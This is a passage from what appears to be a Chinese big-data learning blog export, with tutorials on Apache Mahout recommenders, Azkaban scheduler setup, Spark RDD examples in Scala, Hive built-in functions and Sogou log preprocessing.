-zxvf apache-mahout-distribution-0.10.1.tar.gzmv apache-mahout-distribution-0.10.1 /usr/local/mahout 编辑环境变量 123456vi /etc/profileexport MAHOUT_HOME=/usr/local/mahoutexport PATH=$&#123;MAHOUT_HOME&#125;/bin:$PATHsource /etc/profile # 测试运行 1234567#将测试数据集上传hdfs并改名为testdatahdfs dfs -put synthetic_control.data testdatahdfs dfs -lsr#默认上传到&quot;/user/用户名/&quot;目录下#运行mahoutmahout -core org.apache.mahout.clustering.syntheticcontrol.kmeans.Job#可以在yarn UI界面看到两个任务 # MahoutAPI Mahout 学习（主要学习内容是 Mahout 中推荐部分的 ItemCF、UserCF、Hadoop 集群部署运行） 1、Mahout 是什么？ Mahout 是一个算法库，集成了很多算法。 Apache Mahout 是 Apache Software Foundation（ASF）旗下的一个开源项目，提供一些可扩展的机器学习领域经典算法的实现，旨在帮助开发人员更加方便快捷地创建智能应用程序。 Mahout 项目目前已经有了多个公共发行版本。Mahout 包含许多实现，包括聚类、分类、推荐过滤、频繁子项挖掘。 通过使用 Apache Hadoop 库，Mahout 可以有效地扩展到 Hadoop 集群。 Mahout 的创始人 Grant Ingersoll 介绍了机器学习的基本概念，并演示了如何使用 Mahout 来实现文档集群、提出建议和组织内容。 2、Mahout 是用来干嘛的？ 2.1 推荐引擎 服务商或网站会根据你过去的行为为你推荐书籍、电影或文章。 2.2 聚类 Google news 使用聚类技术通过标题把新闻文章进行分组，从而按照逻辑线索来显示新闻，而并非给出所有新闻的原始列表。 2.3 分类 雅虎邮箱基于用户以前对正常邮件和垃圾邮件的报告，以及电子邮件自身的特征，来判别到来的消息是否是垃圾邮件。 3、Mahout 协同过滤算法 Mahout 使用了 Taste 来提高协同过滤算法的实现，它是一个基于 Java 实现的可扩展的，高效的推荐引擎。Taste 既实现了最基本的基于用户的和基于内容的推荐算法，同时也提供了扩展接口，使用户可以方便的定义和实现自己的推荐算法。同时，Taste 不仅仅只适用于 Java 应用程序，它可以作为内部服务器的一个组件以 HTTP 和 Web Service 的形式向外界提供推荐的逻辑。Taste 的设计使它能满足企业对推荐引擎在性能、灵活性和可扩展性等方面的要求。 Taste 主要包括以下几个接口： DataModel 是用户喜好信息的抽象接口，它的具体实现支持从任意类型的数据源抽取用户喜好信息。Taste 默认提供 JDBCDataModel 和 FileDataModel，分别支持从数据库和文件中读取用户的喜好信息。 UserSimilarity 和 ItemSimilarity 。UserSimilarity 用于定义两个用户间的相似度，它是基于协同过滤的推荐引擎的核心部分，可以用来计算用户的 “邻居”，这里我们将与当前用户口味相似的用户称为他的邻居。ItemSimilarity 类似的，计算 Item 之间的相似度。 UserNeighborhood 用于基于用户相似度的推荐方法中，推荐的内容是基于找到与当前用户喜好相似的邻居用户的方式产生的。UserNeighborhood 定义了确定邻居用户的方法，具体实现一般是基于 UserSimilarity 计算得到的。 Recommender 是推荐引擎的抽象接口，Taste 中的核心组件。程序中，为它提供一个 DataModel，它可以计算出对不同用户的推荐内容。实际应用中，主要使用它的实现类 GenericUserBasedRecommender 或者 GenericItemBasedRecommender，分别实现基于用户相似度的推荐引擎或者基于内容的推荐引擎。 RecommenderEvaluator ：评分器。 RecommenderIRStatsEvaluator ：搜集推荐性能相关的指标，包括准确率、召回率等等。 4、Mahout 协同过滤算法编程 1、创建 maven 项目 2、导入 mahout 依赖 [](javascript:void (0)😉 123456789101112131415161718&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.mahout&lt;/groupId&gt; &lt;artifactId&gt;mahout&lt;/artifactId&gt; &lt;version&gt;0.11.1&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.mahout&lt;/groupId&gt; &lt;artifactId&gt;mahout-examples&lt;/artifactId&gt; &lt;version&gt;0.11.1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;org.slf4j&lt;/groupId&gt; &lt;artifactId&gt;slf4j-log4j12&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;&lt;/dependencies&gt; [](javascript:void (0)😉 3、下载电影评分数据 下载地址：http://grouplens.org/datasets/movielens/ 数据类别：7.2 万用户对 1 万部电影的百万级评价和 10 万个标签数据 4、基于用户的推荐 [](javascript:void (0)😉 12345678910111213141516171819202122232425262728293031323334353637383940 1 package com.ahu.learnmahout; 2 3 import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood; 4 import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender; 5 import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity; 6 import org.apache.mahout.cf.taste.model.DataModel; 7 import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood; 8 import org.apache.mahout.cf.taste.recommender.RecommendedItem; 9 import org.apache.mahout.cf.taste.recommender.Recommender;10 import org.apache.mahout.cf.taste.similarity.UserSimilarity;11 import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;12 13 import java.io.File;14 import java.util.List;15 16 /**17 * Created by ahu_lichang on 2017/6/23.18 */19 public class BaseUserRecommender &#123;20 public static void main(String[] args) throws Exception &#123;21 //准备数据 这里是电影评分数据22 File file = new File(&quot;E:\\\\ml-10M100K\\\\ratings.dat&quot;);23 //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的24 DataModel dataModel = new GroupLensDataModel(file);25 //计算相似度，相似度算法有很多种，欧几里得、皮尔逊等等。26 UserSimilarity similarity = new PearsonCorrelationSimilarity(dataModel);27 //计算最近邻域，邻居有两种算法，基于固定数量的邻居和基于相似度的邻居，这里使用基于固定数量的邻居28 UserNeighborhood userNeighborhood = new NearestNUserNeighborhood(100, similarity, dataModel);29 //构建推荐器，协同过滤推荐有两种，分别是基于用户的和基于物品的，这里使用基于用户的协同过滤推荐30 Recommender recommender = new GenericUserBasedRecommender(dataModel, userNeighborhood, similarity);31 //给用户ID等于5的用户推荐10部电影32 List&lt;RecommendedItem&gt; recommendedItemList = recommender.recommend(5, 10);33 //打印推荐的结果34 System.out.println(&quot;使用基于用户的协同过滤算法&quot;);35 System.out.println(&quot;为用户5推荐10个商品&quot;);36 for (RecommendedItem recommendedItem : recommendedItemList) &#123;37 System.out.println(recommendedItem);38 &#125;39 &#125;40 &#125; [](javascript:void (0)😉 运行结果： 5、基于物品的推荐 [](javascript:void (0)😉 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ahu.learnmahout;import org.apache.mahout.cf.taste.impl.recommender.GenericItemBasedRecommender;import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;import org.apache.mahout.cf.taste.model.DataModel;import org.apache.mahout.cf.taste.recommender.RecommendedItem;import org.apache.mahout.cf.taste.similarity.ItemSimilarity;import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;import java.io.File;import java.util.List;/** * Created by ahu_lichang on 2017/6/24. */public class BaseItemRecommender &#123; public static void main(String[] args) throws Exception &#123; //准备数据 这里是电影评分数据 File file = new File(&quot;E:\\\\ml-10M100K\\\\ratings.dat&quot;); //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的 DataModel dataModel = new GroupLensDataModel(file); //计算相似度，相似度算法有很多种，欧几里得、皮尔逊等等。 ItemSimilarity itemSimilarity = new PearsonCorrelationSimilarity(dataModel); //构建推荐器，协同过滤推荐有两种，分别是基于用户的和基于物品的，这里使用基于物品的协同过滤推荐 GenericItemBasedRecommender recommender = new GenericItemBasedRecommender(dataModel, itemSimilarity); //给用户ID等于5的用户推荐10个与2398相似的商品 List&lt;RecommendedItem&gt; recommendedItemList = recommender.recommendedBecause(5, 2398, 10); //打印推荐的结果 System.out.println(&quot;使用基于物品的协同过滤算法&quot;); System.out.println(&quot;根据用户5当前浏览的商品2398，推荐10个相似的商品&quot;); for (RecommendedItem recommendedItem : recommendedItemList) &#123; System.out.println(recommendedItem); &#125; long start = System.currentTimeMillis(); recommendedItemList = recommender.recommendedBecause(5, 34, 10); //打印推荐的结果 System.out.println(&quot;使用基于物品的协同过滤算法&quot;); System.out.println(&quot;根据用户5当前浏览的商品34，推荐10个相似的商品&quot;); for (RecommendedItem recommendedItem : recommendedItemList) &#123; System.out.println(recommendedItem); &#125; System.out.println(System.currentTimeMillis() -start); &#125;&#125; [](javascript:void (0)😉 运行结果： 6、评估推荐模型 [](javascript:void (0)😉 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.ahu.learnmahout;import org.apache.mahout.cf.taste.common.TasteException;import org.apache.mahout.cf.taste.eval.RecommenderBuilder;import org.apache.mahout.cf.taste.eval.RecommenderEvaluator;import org.apache.mahout.cf.taste.impl.eval.AverageAbsoluteDifferenceRecommenderEvaluator;import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood;import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender;import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;import org.apache.mahout.cf.taste.model.DataModel;import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood;import org.apache.mahout.cf.taste.recommender.Recommender;import org.apache.mahout.cf.taste.similarity.UserSimilarity;import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;import java.io.File;/** * Created by ahu_lichang on 2017/6/24. */public class MyEvaluator &#123; public static void main(String[] args) throws Exception &#123; //准备数据 这里是电影评分数据 File file = new File(&quot;E:\\\\ml-10M100K\\\\ratings.dat&quot;); //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的 DataModel dataModel = new GroupLensDataModel(file); //推荐评估，使用均方根 //RecommenderEvaluator evaluator = new RMSRecommenderEvaluator(); //推荐评估，使用平均差值 RecommenderEvaluator evaluator = new AverageAbsoluteDifferenceRecommenderEvaluator(); RecommenderBuilder builder = new RecommenderBuilder() &#123; public Recommender buildRecommender(DataModel dataModel) throws TasteException &#123; UserSimilarity similarity = new PearsonCorrelationSimilarity(dataModel); UserNeighborhood neighborhood = new NearestNUserNeighborhood(2, similarity, dataModel); return new GenericUserBasedRecommender(dataModel, neighborhood, similarity); &#125; &#125;; // 用70%的数据用作训练，剩下的30%用来测试 double score = evaluator.evaluate(builder, null, dataModel, 0.7, 1.0); //最后得出的评估值越小，说明推荐结果越好 System.out.println(score); &#125;&#125; [](javascript:void (0)😉 7、获取推荐的准确率和召回率 [](javascript:void (0)😉 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.ahu.learnmahout;import org.apache.mahout.cf.taste.common.TasteException;import org.apache.mahout.cf.taste.eval.IRStatistics;import org.apache.mahout.cf.taste.eval.RecommenderBuilder;import org.apache.mahout.cf.taste.eval.RecommenderIRStatsEvaluator;import org.apache.mahout.cf.taste.impl.eval.GenericRecommenderIRStatsEvaluator;import org.apache.mahout.cf.taste.impl.neighborhood.NearestNUserNeighborhood;import org.apache.mahout.cf.taste.impl.recommender.GenericUserBasedRecommender;import org.apache.mahout.cf.taste.impl.similarity.PearsonCorrelationSimilarity;import org.apache.mahout.cf.taste.model.DataModel;import org.apache.mahout.cf.taste.neighborhood.UserNeighborhood;import org.apache.mahout.cf.taste.recommender.Recommender;import org.apache.mahout.cf.taste.similarity.UserSimilarity;import org.apache.mahout.cf.taste.similarity.precompute.example.GroupLensDataModel;import java.io.File;/** * Created by ahu_lichang on 2017/6/24. */public class MyIRStatistics &#123; public static void main(String[] args) throws Exception &#123; //准备数据 这里是电影评分数据 File file = new File(&quot;E:\\\\ml-10M100K\\\\ratings.dat&quot;); //将数据加载到内存中，GroupLensDataModel是针对开放电影评论数据的 DataModel dataModel = new GroupLensDataModel(file); RecommenderIRStatsEvaluator statsEvaluator = new GenericRecommenderIRStatsEvaluator(); RecommenderBuilder recommenderBuilder = new RecommenderBuilder() &#123; public Recommender buildRecommender(DataModel model) throws TasteException &#123; UserSimilarity similarity = new PearsonCorrelationSimilarity(model); UserNeighborhood neighborhood = new NearestNUserNeighborhood(4, similarity, model); return new GenericUserBasedRecommender(model, neighborhood, similarity); &#125; &#125;; // 计算推荐4个结果时的查准率和召回率 //使用评估器，并设定评估期的参数 //4表示&quot;precision and recall at 4&quot;即相当于推荐top4，然后在top-4的推荐上计算准确率和召回率 IRStatistics stats = statsEvaluator.evaluate(recommenderBuilder, null, dataModel, null, 4, GenericRecommenderIRStatsEvaluator.CHOOSE_THRESHOLD, 1.0); System.out.println(stats.getPrecision()); System.out.println(stats.getRecall()); &#125;&#125; [](javascript:void (0)😉 5、Mahout 运行在 Hadoop 集群 **1、**Hadoop 执行脚本 hadoop jar mahout-examples-0.9-job.jar org.apache.mahout.cf.taste.hadoop.item.RecommenderJob --input /sanbox/movie/10M.txt --output /sanbox/movie/r -s SIMILARITY_LOGLIKELIHOOD 参数说明 –input (path) : 存储用户偏好数据的目录，该目录下可以包含一个或多个存储用户偏好数据的文本文件； –output (path) : 结算结果的输出目录 –numRecommendations (integer) : 为每个用户推荐的 item 数量，默认为 10 –usersFile (path) : 指定一个包含了一个或多个存储 userID 的文件路径，仅为该路径下所有文件包含的 userID 做推荐计算 (该选项可选) –itemsFile (path) : 指定一个包含了一个或多个存储 itemID 的文件路径，仅为该路径下所有文件包含的 itemID 做推荐计算 (该选项可选) –filterFile (path) : 指定一个路径，该路径下的文件包含了 [userID,itemID] 值对，userID 和 itemID 用逗号分隔。计算结果将不会为 user 推荐 [userID,itemID] 值对中包含的 item (该选项可选) –booleanData (boolean) : 如果输入数据不包含偏好数值，则将该参数设置为 true，默认为 false –maxPrefsPerUser (integer) : 在最后计算推荐结果的阶段，针对每一个 user 使用的偏好数据的最大数量，默认为 10 –minPrefsPerUser (integer) : 在相似度计算中，忽略所有偏好数据量少于该值的用户，默认为 1 –maxSimilaritiesPerItem (integer) : 针对每个 item 的相似度最大值，默认为 100 –maxPrefsPerUserInItemSimilarity (integer) : 在 item 相似度计算阶段，针对每个用户考虑的偏好数据最大数量，默认为 1000 –similarityClassname (classname) : 向量相似度计算类 outputPathForSimilarityMatrix ：SimilarityMatrix 输出目录 –randomSeed ：随机种子 – sequencefileOutput ：序列文件输出路径 –tempDir (path) : 存储临时文件的目录，默认为当前用户的 home 目录下的 temp 目录 –threshold (double) : 忽略相似度低于该阀值的 item 对 2、 执行结果 上面命令运行完成之后，会在当前用户的 hdfs 主目录生成 temp 目录，该目录可由 --tempDir (path) 参数设置. 后期学习补充： Mahout 是基于 Hadoop 的机器学习和数据挖掘的一个分布式框架。Mahout 用 MapReduce 实现了部分数据挖掘算法，解决了并行挖掘的问题。 Mahout 应用场景：","categories":[{"name":"Hive","slug":"Hive","permalink":"http://example.com/categories/Hive/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"Azkaban","slug":"Hive学习/Azkaban","date":"2021-11-05T09:23:59.000Z","updated":"2021-11-07T07:16:01.863Z","comments":true,"path":"2021/11/05/Hive学习/Azkaban/","link":"","permalink":"http://example.com/2021/11/05/Hive%E5%AD%A6%E4%B9%A0/Azkaban/","excerpt":"","text":"# Azkaban 任务调度 # 安装 Azkaban 准备安装包 将安装包解压 12345tar -zxvf azkaban-web-server-2.5.0.tar.gztar -zxvf azkaban-sql-script-2.5.0.tar.gz tar -zxvf azkaban-executor-server-2.5.0.tar.gzmv azkaban-web-2.5.0/ /usr/local/azkaban-webmv azkaban-executor-2.5.0/ /usr/local/azkaban-executor 创建 mysql 用户 1234567mysql -u root -pcreate database azkaban;grant all on azkaban.* to azkaban@&#x27;localhost&#x27; identified by &#x27;azkaban&#x27;;grant all on azkaban.* to azkaban@&#x27;%&#x27; identified by &#x27;azkaban&#x27;;flush privileges;use azkabansource /root/azkaban-2.5.0/create-all-sql-2.5.0.sql; 创建证书 1234567891011121314151617181920212223keytool -keystore keystore -alias jetty -genkey -keyalg RSA#都默认吧，记住自己的密码mv keystore /usr/local/azkaban-web/#放到web应用里vi conf/azkaban.properties#修改以下数据database.type=mysqlmysql.port=3306mysql.host=localhostmysql.database=azkabanmysql.user=azkabanmysql.password=azkabanmysql.numconnections=100# Azkaban Jetty server properties.jetty.maxThreads=25jetty.ssl.port=8443jetty.port=8081jetty.keystore=keystorejetty.password=azkabanjetty.keypassword=azkabanjetty.truststore=keystorejetty.trustpassword=azkaban 编辑 executor 配置 123456789101112131415161718192021cd azkaban-executor/vi conf/azkaban.propertiesdatabase.type=mysqlmysql.port=3306mysql.host=localhostmysql.database=azkabanmysql.user=azkabanmysql.password=azkabanmysql.numconnections=100cd /usr/local/azkaban-web/vi conf/azkaban-users.xml &lt;azkaban-users&gt; &lt;user username=&quot;azkaban&quot; password=&quot;azkaban&quot; roles=&quot;admin&quot; groups=&quot;azkaban&quot; /&gt; &lt;user username=&quot;metrics&quot; password=&quot;metrics&quot; roles=&quot;metrics&quot;/&gt; &lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;admin,metrics&quot;/&gt; &lt;role name=&quot;admin&quot; permissions=&quot;ADMIN&quot; /&gt; &lt;role name=&quot;metrics&quot; permissions=&quot;METRICS&quot;/&gt;&lt;/azkaban-users&gt; 启动应用 12345cd /usr/local/azkaban-executor/bin/azkaban-executor-start.shcd /usr/local/azkaban-web/bin/azkaban-web-start.sh #注意先启动executor，再启动webserver，避免出错 访问网页 https://yourhost:8443 admin 登陆 # Azkaban 使用方法 编写 Hive 作业并使用 azkaban 运行 为了让 azkaban 支持 Hive 作业，需要使用 jobtype 插件，将下载好的压缩包解压至 azkaban-executor/plugins/ 目录下 12345cd /usr/local/azkaban-executor/plugins/tar -zxvf azkaban-jobtype-2.5.0.tar.gzcd azkaban-jobtype-2.5.0vi common.properties#添加hadoop和hive家目录 编写 hiveCount 脚本以及 job 文件 123456vi hiveCount.sh#!/bin/bashhive -e &quot;select count(distinct uid) from sogou.sogou_500w&quot;vi hiveCount.jobtype=commandcommand=bash hiveCount.sh 将编写好的两个文件打包成 zip 并上传 web 界面 运行结束","categories":[],"tags":[]},{"title":"Spark+RDD","slug":"Spark学习/Spark-RDD","date":"2021-10-13T00:40:00.000Z","updated":"2021-12-08T08:09:19.293Z","comments":true,"path":"2021/10/13/Spark学习/Spark-RDD/","link":"","permalink":"http://example.com/2021/10/13/Spark%E5%AD%A6%E4%B9%A0/Spark-RDD/","excerpt":"","text":"# Spark RDD 编程案例 # WordCount WordCount 编程是我们最熟悉不过的了，使用 Spark 进行编写程序会比 MapReduce 编程简便许多。 代码示例如下： 123456789101112131415161718192021import org.apache.spark.&#123;SparkConf, SparkContext&#125;object WordCount &#123; def main(args: Array[String]): Unit = &#123; val config: SparkConf = new SparkConf().setMaster(&quot;local[*]&quot;).setAppName(&quot;WordCount&quot;) //设置内核个数以及程序名称 val sc: SparkContext = new SparkContext(config) //创建Spark上下文 sc.setLogLevel(&quot;WARN&quot;) val result: Array[(String,Int)] = sc.textFile(&quot;in&quot;). //逐行读入数据，路径是项目根目录下in文件夹 flatMap(_.split(&quot; &quot;)). //拆分单词 map((_,1)). //将每个单词变成键值对 reduceByKey(_+_). //对每个键值对进行处理，对于相同的键进行相加 collect() result.foreach(x =&gt; println(x)) &#125;&#125; 这里选择从本地文件导入数据，存放在 Idea 项目根目录下 in 文件夹，数据内容以及运行结果如下： 1234567891011121314151617181920212223242526//输入数据hadoop hellospark helloambari yesscala javahive hbasehadoop hellospark helloambari yesscala javahive hbasehive hbasehadoop hellospark helloambari yes//输出结果(scala,2)(hive,3)(ambari,3)(hello,6)(java,2)(spark,3)(yes,3)(hadoop,3)(hbase,3) # TopN TopN 功能是实现对一个较大数据量的数据进行排序，之后输出前 N 条数据，一般来说有 3 种类型的 TopN 写法，这里使用的是键不相同的写法。 12345678910111213141516171819202122import org.apache.spark.&#123;SparkConf, SparkContext&#125;object TopN &#123; def main(args: Array[String]): Unit = &#123; val config: SparkConf = new SparkConf().setMaster(&quot;local[*]&quot;).setAppName(&quot;TopN&quot;) //设置内核个数以及程序名称 val sc: SparkContext = new SparkContext(config) //创建Spark上下文 sc.setLogLevel(&quot;WARN&quot;) val result: Array[(String,String )] = sc.textFile(&quot;in/top/&quot;) //逐行读入数据，路径是项目根目录下in/top文件夹 .map(_.split(&quot; &quot;)) //按空格分开 .map(line =&gt; (line(0), line(1))) //映射键值对 .sortByKey(false) //按键进行排序，默认升序，false降序 .take(5) //取结果前N个 result.foreach(println) &#125;&#125; 输入数据以及输出结果： 123456789101112131415161718//输入数据56 test173 test284 test374 test483 test593 test688 test781 test892 test934 test10//输出(93,test6)(92,test9)(88,test7)(84,test3)(83,test5) # Avg 题目：给定一组键值对 (“spark”,2),(“hadoop”,6),(“hadoop”,4),(“spark”,6)，键值对的 key 表示图书名称，value 表示某天图书销量，请计算每个键对应的平均值，也就是计算每种图书的每天平均销量。 代码示例如下： 123456789101112131415161718192021import org.apache.spark.&#123;SparkConf, SparkContext&#125;object Avg &#123; def main(args: Array[String]): Unit = &#123; val config: SparkConf = new SparkConf().setMaster(&quot;local[*]&quot;).setAppName(&quot;Avg&quot;) //设置内核个数以及程序名称 val sc: SparkContext = new SparkContext(config) //创建Spark上下文 sc.setLogLevel(&quot;WARN&quot;) val data = Array((&quot;spark&quot;,2),(&quot;hadoop&quot;,6),(&quot;hadoop&quot;,4),(&quot;spark&quot;,6)) val res = sc.parallelize(data) //读入数据 .mapValues(a =&gt; (a,1)) //将值映射成为（值，次数）的形式 .reduceByKey((a,b) =&gt; (a._1+b._1,a._2+b._2)) //相同键进行Reduce，累加次数以及销量 .map(t =&gt; (t._1,t._2._1/t._2._2)) //计算平均值 res.foreach(println) &#125;&#125; 这里使用简易的数组导入数据，使用 parallelize () 方法，输出如下： 12345//output(spark,4)(hadoop,5)进程已结束，退出代码 0 # SecondarySort 二次排序也是一个经典案例，实现按键排序的同时按值排序，代码如下： 1234567891011121314151617181920212223242526272829303132333435import org.apache.spark.&#123;SparkConf, SparkContext&#125;//定义一个比较类，重写比较方法，记得加上序列化class SecondarySortKey(val first: Int, val second: Int) extends Ordered[SecondarySortKey] with Serializable &#123; def compare(other: SecondarySortKey): Int = if (this.first - other.first != 0) this.first - other.first else this.second - other.second&#125;object SecondarySort &#123; def main(args: Array[String]): Unit = &#123; val config: SparkConf = new SparkConf().setMaster(&quot;local[*]&quot;).setAppName(&quot;SecondarySort&quot;) //设置内核个数以及程序名称 val sc: SparkContext = new SparkContext(config) //创建Spark上下文 sc.setLogLevel(&quot;WARN&quot;) val result: Array[(Int,Int)] = sc.textFile(&quot;in/second&quot;) //逐行读入数据，路径是项目根目录下in/second文件夹 .map(_.split(&quot; &quot;)) //按空格分开 .map(line =&gt; (line(0).toInt, line(1).toInt)) //映射键值对 .map(line =&gt; (new SecondarySortKey(line._1,line._2), line)) //映射成为（可比较类，原数据）的形式 .sortByKey(false) //按键降序 .map(x =&gt; x._2).collect() //排序完只保留原数据 result.foreach(println) &#125;&#125; 输入数据以及输出结果： 12345678910111213141516171819202122//input32 3525 4652 6529 8585 4225 4595 9675 9675 62//output(95,96)(85,42)(75,96)(75,62)(52,65)(32,35)(29,85)(25,46)(25,45)","categories":[{"name":"Spark学习","slug":"Spark学习","permalink":"http://example.com/categories/Spark%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"大数据","slug":"大数据","permalink":"http://example.com/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE/"}]},{"title":"Hive查询进阶","slug":"Hive学习/hive5","date":"2021-10-08T09:57:10.000Z","updated":"2021-11-02T13:18:05.907Z","comments":true,"path":"2021/10/08/Hive学习/hive5/","link":"","permalink":"http://example.com/2021/10/08/Hive%E5%AD%A6%E4%B9%A0/hive5/","excerpt":"","text":"# HiveQL 数据查询进阶 本章要点 Hive 内置函数 Hive 构建搜索日志分析系统 Sqoop 应用与开发 # Hive 内置函数 Hive 内置函数就是 Hive 中可以直接使用的函数，首先查看一下有哪些函数 1234567891011121314151617181920212223242526272829303132show functions;INFO : OK+------------------------------+| tab_name |+------------------------------+| ! || != || $sum0 || % || &amp; || * || + || - || / || &lt; || &lt;= || &lt;=&gt; || &lt;&gt; || = || == || &gt; || &gt;= || ^ || abs || acos || add_months || aes_decrypt || aes_encrypt || and |...+------------------------------+289 rows selected (0.494 seconds) 其中常用的如 avg 求平均，concat 连接函数，count 统计等。内置函数可以被分成：数学函数、字符函数、收集函数、转换函数、日期函数、条件函数、聚合函数以及表生成函数。 # 数学函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#加法select 10+10;INFO : OK+------+| 20 |+------+1 row selected (1.324 seconds)#减法select 15-3;INFO : OK+------+| 12 |+------+1 row selected (0.564 seconds)#乘除*/select 6*6;INFO : OK+------+| 36 |+------+1 row selected (0.867 seconds)select 36/6;INFO : OK+------+| 6.0 |+------+1 row selected (0.734 seconds)#round四舍五入select round(88.999,2),round(78.600,1), round(55.776,2);INFO : OK+--------+-------+--------+| 89.00 | 78.6 | 55.78 |+--------+-------+--------+1 row selected (0.505 seconds)#ceil向上取整select ceil(84.5);INFO : OK+------+| 85 |+------+1 row selected (0.542 seconds)#floor向下取整select floor(45.9);INFO : OK+------+| 45 |+------+1 row selected (0.535 seconds)#pow 平方函数select pow(2,3);INFO : OK+------+| 8.0 |+------+1 row selected (0.357 seconds)#pmod 取模函数select pmod(9,8);INFO : OK+------+| 1 |+------+1 row selected (0.242 seconds) # 字符函数 123456789101112131415161718192021222324252627282930#lower转小写select lower(&quot;FJKNXCYT&quot;);+-----------+| fjknxcyt |+-----------+#upper转大写select upper(&quot;asdjnkgbasd&quot;);+--------------+| ASDJNKGBASD |+--------------+#length字符串长度select length(&quot;hadoop&quot;);+------+| 6 |+------+#concat字符拼接select concat(&quot;hadoop&quot;, &quot;&amp;hive&quot;);+--------------+| hadoop&amp;hive |+--------------+#substr取子串(从8开始取5个)select substr(&quot;hadoop spark hive&quot;, 8, 5);+--------+| spark |+--------+#trim去除前后空格select trim(&quot; hadoop &quot;);+---------+| hadoop |+---------+ # 转换函数 12345#cast类型转换函数select cast (88 as double);+-------+| 88.0 |+-------+ # 日期函数 12345678910#year month day 分别获取年月日select year(&quot;2021-10-08 18:40:24&quot;), month(&quot;2021-10-08 18:40:24&quot;), day(&quot;2021-10-08 18:40:24&quot;);+-------+------+------+| 2021 | 10 | 8 |+-------+------+------+#to_date返回字段中日期部分select to_date(&quot;2021-10-08 18:40:24&quot;);+-------------+| 2021-10-08 |+-------------+ # 条件函数 123456789#case A when B then C when D then E else F end;select ts, uid, rank, case rank when &quot;2&quot; then rank+1 else rank-1 end from sogou.sogou_liangjian;+-----------------+-----------------------------------+-------+------+| ts | uid | rank | _c3 |+-----------------+-----------------------------------+-------+------+| 20111230104333 | 53a3b5132bd6af7d324f3fd55d7153ba | 3 | 2 || 20111230104334 | 966a6bf4c4ec1cc693b6e40702984235 | 4 | 3 || 20111230104334 | ae55d5e4b4f29a1221816a121e087567 | 2 | 3 |+-----------------+-----------------------------------+-------+------+ # 聚合函数 123456789101112131415161718192021222324252627#count返回行数select count(*) from sogou.sogou_xj;+-------+| 1330 |+-------+#sum求和select sum(orders) as ordersum from sogou.sogou_xj;+-----------+| ordersum |+-----------+| 2043 |+-----------+#min列最小值select min(orders) from sogou.sogou_xj;+------+| 1 |+------+#max列最大值select max(rank) from sogou.sogou_xj;+------+| 10 |+------+#avg列平均值select avg(rank) from sogou.sogou_xj;+---------------------+| 2.9225563909774435 |+---------------------+ # Hive 构建搜索日志分析系统 # 数据预处理 (Linux 环境) 查看数据 12[root@hdp-1 hive]# wc -l sogou.500w.utf8 5000000 sogou.500w.utf8 数据拓展 将用户访问的时间拆分成，年月日小时字段，为后面创建分区表做准备，编写一个 shell 脚本实现此功能。 1234567891011vi pre.sh #!/bin/bashinfile=$1outfile=$2awk -F &#x27;\\t&#x27; &#x27;&#123;print $0&quot;\\t&quot;substr($1,1,4)&quot;\\t&quot;substr($1,5,2)&quot;\\t&quot;substr($1,7,2)&quot;\\t&quot;substr($1,9,2)&#125;&#x27; $infile &gt; $outfilechmod +x pre.shsh pre.sh ./sogou.500w.utf8 ./sogou.500w.utf8.extless sogou.500w.utf8.ext 数据加载 将数据放到 HDFS 上 12hdfs dfs -mkdir -p /usr/local/hive/hdfs dfs -put ./sogou.500w.utf8.ext /usr/local/hive/ # 基于 Hive 构建日志的数据仓库 启动 Hadoop 集群，打开 Hive 客户端 基本操作 1234567891011121314151617181920212223242526272829303132333435363738show databases;+---------------------+| database_name |+---------------------+| default || information_schema || sogou || sys |+---------------------+create database if not exists sogou;use sogou;show tables;+------------------+| tab_name |+------------------+| sogou_500w || sogou_liangjian || sogou_xj || sogou_xj_backup |+------------------+#创建外部表sogou_0936加载sogou.500w.utf8的数据create external table if not exists sogou.sogou_0936(ts string,uid string,keyword string, rank int, orders int, url string) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile location &#x27;/usr/local/hive/raw/&#x27;;#创建外部表sogou_ext加载sogou.500w.utf8.ext的数据 create external table if not exists sogou.sogou_ext(ts string,uid string,keyword string, rank int, orders int, url string) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile location &#x27;/usr/local/hive/ext/&#x27;#查看数据没问题select * from sogou_0936 limit 10;select * from sogou_ext limit 10;desc sogou_0936;+-----------+------------+----------+| col_name | data_type | comment |+-----------+------------+----------+| ts | string | || uid | string | || keyword | string | || rank | int | || orders | int | || url | string | |+-----------+------------+----------+ 创建分区表 12345678910111213141516171819202122#创建分区表create external table if not exists sogou.sogou_partition(ts string,uid string,keyword string, rank int, orders int, url string) partitioned by (year int, month int, day int, hour int ) row format delimited fields terminated by &#x27;\\t&#x27; stored as textfile;#查看表show tables;+------------------+| tab_name |+------------------+| sogou_0936 || sogou_500w || sogou_ext || sogou_liangjian || sogou_partition || 